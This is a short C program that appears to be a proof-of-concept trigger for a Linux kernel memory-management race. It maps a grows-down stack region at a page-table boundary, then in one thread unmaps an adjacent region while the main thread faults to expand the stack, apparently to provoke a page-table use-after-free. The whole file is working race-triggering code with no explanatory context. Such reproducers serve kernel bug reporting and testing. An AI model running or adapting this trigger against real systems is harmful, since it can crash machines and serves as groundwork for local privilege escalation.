#define _GNU_SOURCE
#include <pthread.h>
#include <unistd.h>
#include <err.h>
#include <sys/mman.h>
#include <sys/prctl.h>

/*
 * points to a virtual address that is at the start of the
 * VA range covered by an L4 page table
 */
#define STACK_STRADDLE_ADDR ((char*)0x4000000000UL)

/* VA range covered by an L2 page table */
#define L2_TABLE_RANGE 0x200000UL

/* start of a VMA that covers one L2 range before STACK_STRADDLE_ADDR */
#define UNMAP_ADDR (STACK_STRADDLE_ADDR - L2_TABLE_RANGE)

/* faulting here will expand stack from STACK_STRADDLE_ADDR */
#define EXPAND_FAULT_ADDR (STACK_STRADDLE_ADDR - 0x1000)

void *threadfn(void *arg) {
  prctl(PR_SET_NAME, "race_munmap");
  int res = munmap(UNMAP_ADDR, L2_TABLE_RANGE); /* race occurs here */
  prctl(PR_SET_NAME, "race_munmap_");


  return NULL;
}

int main(void) {
  char *a = mmap(STACK_STRADDLE_ADDR, 0x1000, PROT_READ|PROT_WRITE,
                 MAP_ANONYMOUS|MAP_PRIVATE|MAP_GROWSDOWN|MAP_FIXED_NOREPLACE,
                 -1, 0);
  if (a != STACK_STRADDLE_ADDR)
    return -1;
  char *b = mmap(UNMAP_ADDR, L2_TABLE_RANGE, PROT_READ|PROT_WRITE,
                 MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED_NOREPLACE, -1, 0);
  if (b != UNMAP_ADDR)
    return -1;
  if (madvise(UNMAP_ADDR, L2_TABLE_RANGE, MADV_NOHUGEPAGE))
   return -1;
  *(volatile char *)UNMAP_ADDR = 1; /* force page table allocation */

  pthread_t thread;
  if (pthread_create(&thread, NULL, threadfn, NULL))
    return -1;

  sleep(1); /* wait for VMA removal */
  prctl(PR_SET_NAME, "race_fault");
  *(volatile char *)EXPAND_FAULT_ADDR = 1; /* race occurs here */
  prctl(PR_SET_NAME, "race_fault_");

  pthread_join(thread, NULL);
}